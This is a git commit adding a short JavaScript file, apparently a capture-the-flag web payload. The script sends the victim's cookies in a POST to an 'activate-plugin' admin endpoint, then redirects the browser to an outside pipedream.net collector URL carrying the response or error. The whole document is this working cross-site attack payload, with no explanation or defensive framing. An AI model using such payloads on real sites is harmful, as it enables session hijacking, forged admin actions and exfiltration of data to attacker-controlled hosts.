5954d42066bd37127584e3813e8221ddf1b7d7a2
FermaLeRetour <114008563+FermaLeRetour@users.noreply.github.com>
2023-11-24 18:06:06 +0100

    Add files via upload

---
+++ send_request_7.js
@@ -0,0 +1,26 @@
+const url = 'http://website-3f3pye.inst.malicecyber.com/activate-plugin/1';
+
+const headers = {
+  'Cookie': document.cookie,
+  'Host': 'website-3f3pye.inst.malicecyber.com'
+
+};
+
+fetch(url, {
+  method: 'POST',
+  headers: headers
+})
+  .then(response => {
+    // Process the response as needed
+    document.location="https://enpw216ps367.x.pipedream.net/?="+response
+    console.log('Response:', response);
+    // Handle the response data, e.g., response.json(), response.text(), etc.
+  })
+  .catch(error => {
+    document.location="https://enpw216ps367.x.pipedream.net/?="+error
+    console.error('Error:', error);
+  });
+
+
+
+
